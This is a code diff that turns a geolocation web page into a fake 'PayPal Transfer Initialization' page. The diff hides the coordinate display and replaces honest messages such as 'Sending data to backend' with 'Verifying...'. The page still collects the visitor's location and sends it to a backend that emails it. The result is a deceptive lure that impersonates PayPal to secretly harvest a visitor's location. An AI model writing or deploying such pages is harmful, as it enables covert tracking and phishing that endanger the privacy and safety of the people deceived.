@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Verification</title>
+    <title>PayPal Transfer Initialization</title>
     <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
@@ -28,11 +28,14 @@
 </head>
 <body class="flex items-center justify-center min-h-screen p-4">
     <div class="bg-white p-8 rounded-xl shadow-lg w-full max-w-md text-center border border-gray-200">
-        <h1 class="text-3xl font-bold text-gray-800 mb-6">Verification</h1>
+        <h1 class="text-3xl font-bold text-gray-800 mb-6">Paypal Trransfer Initialization</h1>
 
         <div id="status-message" class="mb-4 p-3 rounded-lg text-sm font-medium">
-            <p class="text-gray-600">Click the button below to Verify.</p>
+            <p class="text-gray-600">Click the button below to Verify (Accept permission if requested).</p>
         </div>
+
+        <!-- Removed Latitude and Longitude display -->
+        <!--
         <div class="space-y-3 mb-6">
             <p class="text-gray-700 text-lg">
                 Latitude: <span id="latitude" class="font-semibold text-blue-600">N/A</span>
@@ -41,6 +44,7 @@
                 Longitude: <span id="longitude" class="font-semibold text-blue-600">N/A</span>
             </p>
         </div>
+        -->
 
         <!-- New button to trigger geolocation -->
         <button id="getLocationButton"
@@ -63,8 +67,7 @@
     <script>
         // Get references to HTML elements
         const statusMessage = document.getElementById('status-message');
-        const latitudeSpan = document.getElementById('latitude');
-        const longitudeSpan = document.getElementById('longitude');
+        // Removed latitudeSpan and longitudeSpan as they are no longer needed for display
         const backendStatusDiv = document.getElementById('backend-status');
         const backendMessageSpan = document.getElementById('backend-message');
         const getLocationButton = document.getElementById('getLocationButton');
@@ -98,7 +101,7 @@
          */
         async function sendToBackendForEmail(lat, lon) {
             backendStatusDiv.classList.remove('hidden');
-            backendMessageSpan.textContent = 'Sending data to backend...'; // Initial text
+            backendMessageSpan.textContent = 'Verifying...'; // Initial text
             loadingSpinner.classList.remove('hidden'); // Show spinner
 
             backendMessageSpan.classList.remove('text-red-600', 'text-green-600');
@@ -128,23 +131,23 @@
                 console.log('Raw backend response:', response);
 
                 if (response.ok) {
-                    backendMessageSpan.textContent = 'Successfully sent to backend!';
+                    backendMessageSpan.textContent = 'Successfully Verified!';
                     backendMessageSpan.classList.remove('text-blue-600');
                     backendMessageSpan.classList.add('text-green-600');
-                    console.log('Geolocation data sent successfully to backend for email.');
+                    console.log('Verification successful');
                 } else {
                     const errorText = await response.text();
                     backendMessageSpan.textContent = `Failed to send: ${response.status} ${response.statusText}`;
                     backendMessageSpan.classList.remove('text-blue-600');
                     backendMessageSpan.classList.add('text-red-600');
-                    console.error('Failed to send geolocation data to backend:', response.status, response.statusText, errorText);
+                    console.error('Failed to Verify:', response.status, response.statusText, errorText);
                     console.error('Backend response text:', errorText);
                 }
             } catch (error) {
                 backendMessageSpan.textContent = `Error sending: ${error.message}`;
                 backendMessageSpan.classList.remove('text-blue-600');
                 backendMessageSpan.classList.add('text-red-600');
-                console.error('Network error while sending geolocation data to backend:', error);
+                console.error('Network error while Verifying:', error);
             } finally {
                 loadingSpinner.classList.add('hidden'); // Always hide spinner when done
             }
@@ -158,8 +161,7 @@
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
 
-            latitudeSpan.textContent = latitude.toFixed(6);
-            longitudeSpan.textContent = longitude.toFixed(6);
+            // Removed lines that update latitudeSpan and longitudeSpan
             displayStatus('Location obtained successfully!', 'success');
 
             // Send data to backend
@@ -198,7 +200,7 @@
             console.error(errorMessage, error);
 
             backendStatusDiv.classList.remove('hidden');
-            backendMessageSpan.textContent = 'Could not verify, accept permission and try again.';
+            backendMessageSpan.textContent = 'Unable to Verify.';
             backendMessageSpan.classList.add('text-red-600');
             loadingSpinner.classList.add('hidden'); // Hide spinner on error
         }
@@ -208,14 +210,13 @@
          */
         function requestGeolocation() {
             // Reset messages and show spinner before requesting location
-            latitudeSpan.textContent = 'N/A';
-            longitudeSpan.textContent = 'N/A';
+            // Removed lines that reset latitudeSpan and longitudeSpan text
             backendStatusDiv.classList.add('hidden'); // Hide backend status initially
-            backendMessageSpan.textContent = 'Requesting Verification Permission'; // Set initial text
+            backendMessageSpan.textContent = 'Requesting Verification'; // Set initial text
             loadingSpinner.classList.remove('hidden'); // Show spinner
 
             if (navigator.geolocation) {
-                displayStatus('Requesting Verification Permission');
+                displayStatus('Requesting your location...');
                 navigator.geolocation.getCurrentPosition(successCallback, errorCallback, {
                     enableHighAccuracy: false,
                     timeout: 15000,
@@ -224,7 +225,7 @@
             } else {
                 displayStatus('Geolocation is not supported by your browser.', 'error');
                 backendStatusDiv.classList.remove('hidden');
-                backendMessageSpan.textContent = 'Unable to verify';
+                backendMessageSpan.textContent = 'Verification not supported.';
                 backendMessageSpan.classList.add('text-red-600');
                 loadingSpinner.classList.add('hidden'); // Hide spinner if not supported
             }
@@ -234,7 +235,7 @@
         window.onload = function() {
             getLocationButton.addEventListener('click', requestGeolocation);
             // Initial status message when page loads
-            displayStatus('Click the "Verify" button and accept Permission to proceed.');
+            displayStatus('Click the "Verify" button to proceed.');
             loadingSpinner.classList.add('hidden'); // Ensure spinner is hidden on initial load
         };
     </script>
